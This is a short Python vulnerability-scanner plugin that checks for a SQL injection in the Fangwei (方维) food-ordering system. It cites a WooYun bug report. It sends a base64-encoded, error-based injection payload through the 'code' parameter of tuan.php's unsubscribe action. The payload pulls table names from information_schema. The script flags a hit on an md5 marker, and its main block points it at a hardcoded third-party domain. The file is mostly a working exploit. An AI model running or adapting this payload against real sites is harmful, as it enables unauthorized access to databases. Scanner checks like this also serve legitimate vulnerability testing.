#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 方维订餐系统另一个SQL注射
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0135111
#Author:xq17

def assign(service,arg):
    if service=="fangwei":
        return True,arg
    
def audit(arg):
    payload = "tuan.php?ctl=subscribe&act=unsubscribe&code=J2FuZChzZWxlY3QgMSBmcm9tKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBjb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGxpbWl0IDAsMSksY29uY2F0KDB4N2UsbWQ1KDEpKSxmbG9vcihyYW5kKDApKjIpKXggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYSlhbmQnLS0="
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b1" in res:
        security_hole('find sql injection: ' + arg)

                

if  __name__ == '__main__':
    from dummy import *
    audit(assign("fangwei","http://dc.816go.com/")[1])